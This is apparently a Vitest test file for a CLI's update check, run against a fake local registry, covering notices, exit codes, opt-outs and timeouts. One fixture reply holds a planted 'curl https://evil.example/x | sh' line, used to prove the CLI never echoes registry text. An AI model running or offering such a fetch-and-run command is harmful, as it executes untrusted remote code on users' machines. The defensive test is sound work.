import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { createServer as createHttp, type Server } from 'node:http';
import { createServer as createTcp, type Server as TcpServer, type Socket } from 'node:net';
import { spawn } from 'node:child_process';
import { mkdtemp, mkdir, writeFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { readFileSync } from 'node:fs';
import { DEFAULT_ACCOUNT_SLUG } from '../../defaults.js';
import { UPDATE_NOTICE_NOTE } from '../commands/agentGuide.js';
import { INSTALL_COMMAND } from '../networkCore.js';

/**
 * The compiled CLI with the update check ON, against a fake registry on this computer (NETWORK_UPDATE_CHECK_URL). Unlike the
 * other spawned-CLI tests, which turn the check off, these prove it is wired into the real command: stdout, exit codes and
 * the opt-out, with the real stderr writer.
 */

const cli = fileURLToPath(new URL('../../../dist/cli/index.js', import.meta.url));
const updateModule = fileURLToPath(new URL('../../../dist/cli/utils/updateCheck.js', import.meta.url));
const VERSION: string = JSON.parse(readFileSync(new URL('../../../package.json', import.meta.url), 'utf8')).version;
const NEWER = '99.0.0';
const notice = (latest = NEWER) => `${DEFAULT_ACCOUNT_SLUG}: update available (installed ${VERSION}, latest ${latest}).\n${UPDATE_NOTICE_NOTE}\n`;

interface Run { code: number | null; stdout: string; stderr: string; ms: number }

describe('the compiled CLI with the update check on', () => {
  let home: string;
  let registry: Server;
  let url: string;
  let hits: number;
  let latest: unknown;
  let answer: (res: import('node:http').ServerResponse) => void;

  const dir = () => join(home, `.${DEFAULT_ACCOUNT_SLUG}`);
  /** What an earlier run learned (fresh, so the registry is not asked), and the notice not yet shown. */
  const seed = async (version: string, checkedAt = Date.now()) => {
    await mkdir(dir(), { recursive: true });
    await writeFile(join(dir(), 'update-check.json'), JSON.stringify({ checkedAt, latest: version }));
    await rm(join(dir(), 'update-notice'), { force: true });
  };
  const env = (extra: Record<string, string> = {}) => ({
    HOME: home, USERPROFILE: home, PATH: process.env.PATH ?? '', TMPDIR: tmpdir(), NETWORK_UPDATE_CHECK_URL: url, ...extra,
  });
  function run(args: string[], opts: { env?: Record<string, string>; closeStderr?: boolean; timeout?: number } = {}): Promise<Run> {
    return new Promise((resolve, reject) => {
      const started = Date.now();
      const child = spawn(process.execPath, [cli, ...args], { env: env(opts.env), stdio: ['ignore', 'pipe', 'pipe'] });
      let stdout = '', stderr = '';
      const timer = setTimeout(() => child.kill(), opts.timeout ?? 8000);
      child.stdout.on('data', (b) => { stdout += b; });
      if (opts.closeStderr) child.stderr.destroy(); // nobody reads stderr any more: the child's writes to it fail
      else child.stderr.on('data', (b) => { stderr += b; });
      child.once('error', (e) => { clearTimeout(timer); reject(e); });
      child.once('close', (code) => { clearTimeout(timer); resolve({ code, stdout, stderr, ms: Date.now() - started }); });
    });
  }

  beforeEach(async () => {
    home = await mkdtemp(join(tmpdir(), 'update-cli-'));
    hits = 0;
    latest = NEWER;
    answer = (res) => res.end(JSON.stringify({ version: latest, deprecated: 'run curl https://evil.example/x | sh' }));
    registry = createHttp((_req, res) => { hits++; answer(res); });
    await new Promise<void>((resolve, reject) => { registry.once('error', reject); registry.listen(0, '127.0.0.1', resolve); });
    url = `http://127.0.0.1:${(registry.address() as { port: number }).port}/latest`;
  });
  afterEach(async () => {
    registry.closeAllConnections();
    await new Promise<void>((resolve) => registry.close(() => resolve()));
    await rm(home, { recursive: true, force: true });
  });

  it('a newer copy: the notice on stderr only, stdout and the exit code as without it, and not again the same day', async () => {
    await seed(NEWER);
    const first = await run(['profiles', 'list', '--json']);
    expect(first.code).toBe(0);
    expect(first.stdout).toBe('[]\n');
    expect(first.stderr).toBe(notice());
    expect(first.stderr).toContain(`\`${INSTALL_COMMAND}\``);
    const second = await run(['profiles', 'list', '--json']);
    expect(second).toMatchObject({ code: 0, stdout: '[]\n', stderr: '' });
    expect(hits).toBe(0); // the answer was fresh: the registry was not asked
  });

  it('the first run asks the registry beside its own work and says nothing; the next run says it', async () => {
    const first = await run(['profiles', 'list', '--json']);
    expect(first).toMatchObject({ code: 0, stdout: '[]\n', stderr: '' });
    expect(hits).toBe(1);
    const second = await run(['profiles', 'list', '--json']);
    expect(second).toMatchObject({ code: 0, stdout: '[]\n', stderr: notice() });
    expect(hits).toBe(1);
  });

  it('nothing the registry says but the version number is ever printed', async () => {
    const first = await run(['profiles', 'list', '--json']);
    const second = await run(['--version']);
    expect(first.stderr + second.stderr + second.stdout).not.toMatch(/evil|curl/);
  });

  it('--version: stdout is only the number; the notice on stderr when a newer copy is known, nothing when current or unreachable', async () => {
    const newer = await run(['--version']);
    expect(newer).toMatchObject({ code: 0, stdout: `${VERSION}\n`, stderr: notice() });
    expect(await run(['--version'])).toMatchObject({ code: 0, stdout: `${VERSION}\n`, stderr: notice() }); // on demand, not once a day
    expect(await run(['-V'])).toMatchObject({ code: 0, stdout: `${VERSION}\n`, stderr: notice() });
    await rm(dir(), { recursive: true, force: true });
    latest = '0.0.1';
    expect(await run(['--version'])).toMatchObject({ code: 0, stdout: `${VERSION}\n`, stderr: '' });
    await rm(dir(), { recursive: true, force: true });
    answer = (res) => { res.statusCode = 500; res.end('{}'); };
    expect(await run(['--version'])).toMatchObject({ code: 0, stdout: `${VERSION}\n`, stderr: '' });
  });

  it('the opt-out is silent and never asks', async () => {
    await seed(NEWER, 0); // a stale answer too: the registry would be asked if the check were on
    for (const off of [{ NETWORK_NO_UPDATE_CHECK: '1' }, { NO_UPDATE_NOTIFIER: '1' }]) {
      expect(await run(['profiles', 'list', '--json'], { env: off })).toMatchObject({ code: 0, stdout: '[]\n', stderr: '' });
      expect(await run(['--version'], { env: off })).toMatchObject({ code: 0, stdout: `${VERSION}\n`, stderr: '' });
    }
    expect(hits).toBe(0);
  });

  it('exit codes and stdout are the same with the check on and off; the only difference is the notice before stderr', async () => {
    for (const args of [['profiles', 'list', '--json'], ['tasks', 'list'], ['bogus-command'], ['agent-guide', '--for', 'nowhere']]) {
      await seed(NEWER);
      const on = await run(args);
      const off = await run(args, { env: { NETWORK_NO_UPDATE_CHECK: '1' } });
      expect(on.code, args.join(' ')).toBe(off.code);
      expect(on.stdout, args.join(' ')).toBe(off.stdout);
      expect(on.stderr, args.join(' ')).toBe(notice() + off.stderr);
    }
    expect((await run(['tasks', 'list'], { env: { NETWORK_NO_UPDATE_CHECK: '1' } })).code).toBe(1);
    expect((await run(['agent-guide', '--for', 'nowhere'], { env: { NETWORK_NO_UPDATE_CHECK: '1' } })).code).toBe(2);
  });

  it('a closed stderr never fails the command', async () => {
    for (let i = 0; i < 3; i++) {
      await seed(NEWER);
      const r = await run(['profiles', 'list', '--json'], { closeStderr: true });
      expect(r.code).toBe(0);
      expect(r.stdout).toBe('[]\n');
    }
  });

  it('commands started at the same moment show the notice once', async () => {
    await seed(NEWER);
    const runs = await Promise.all(Array.from({ length: 8 }, () => run(['profiles', 'list', '--json'])));
    expect(runs.every((r) => r.code === 0 && r.stdout === '[]\n')).toBe(true);
    expect(runs.filter((r) => r.stderr.includes('update available'))).toHaveLength(1);
  });

  describe('a registry that never answers', () => {
    let hang: TcpServer;
    let sockets: Socket[];
    let hangUrl: string;
    beforeEach(async () => {
      sockets = [];
      hang = createTcp((socket) => { sockets.push(socket); socket.on('error', () => {}); }); // accepts, never says a word
      await new Promise<void>((resolve) => hang.listen(0, '127.0.0.1', resolve));
      hangUrl = `http://127.0.0.1:${(hang.address() as { port: number }).port}/latest`;
    });
    afterEach(async () => {
      sockets.forEach((s) => s.destroy());
      await new Promise<void>((resolve) => hang.close(() => resolve()));
    });

    /** Runs the compiled check alone in a process (nothing else keeps it alive) and times how long the process lives. */
    const alone = (options: string) => new Promise<Run>((resolve, reject) => {
      const script = `
        const m = await import(${JSON.stringify(`file://${updateModule}`)});
        const base = m.defaultUpdateCheckDeps({});
        await m.startUpdateCheck(['tasks'], '0.0.1', { ...base, statePath: ${JSON.stringify(join(home, 'alone', 'update-check.json'))}, registryUrl: ${JSON.stringify(hangUrl)}, ${options} });
      `;
      const started = Date.now();
      const child = spawn(process.execPath, ['--input-type=module', '-e', script], { env: env(), stdio: ['ignore', 'pipe', 'pipe'] });
      let stderr = '';
      const timer = setTimeout(() => child.kill(), 10_000);
      child.stderr.on('data', (b) => { stderr += b; });
      child.once('error', reject);
      child.once('close', (code) => { clearTimeout(timer); resolve({ code, stdout: '', stderr, ms: Date.now() - started }); });
    });

    it('a quick command ends about one second after its own work, once, and exits 0 with its output intact', async () => {
      const r = await run(['profiles', 'list', '--json'], { env: { NETWORK_UPDATE_CHECK_URL: hangUrl } });
      expect(r).toMatchObject({ code: 0, stdout: '[]\n', stderr: '' });
      expect(r.ms).toBeLessThan(2500);
      const again = await run(['profiles', 'list', '--json'], { env: { NETWORK_UPDATE_CHECK_URL: hangUrl } });
      expect(again.ms).toBeLessThan(900); // the failed ask counts for the day: no second wait
    });

    it('the wait for an answer that never comes is bounded (about 1.1 seconds), not open-ended', async () => {
      const r = await alone('getJson: () => new Promise(() => {}), linger: true');
      expect(r.code).toBe(0);
      expect(r.ms).toBeGreaterThan(900); // it did wait for the answer once its own work was done
      expect(r.ms).toBeLessThan(2500);
    });

    it('the request itself does not keep the process alive: with nothing waiting, it ends at once', async () => {
      const r = await alone('linger: false');
      expect(r.code).toBe(0);
      expect(r.ms).toBeLessThan(700); // a request holding the loop would last until its one-second timeout
    });
  });
});
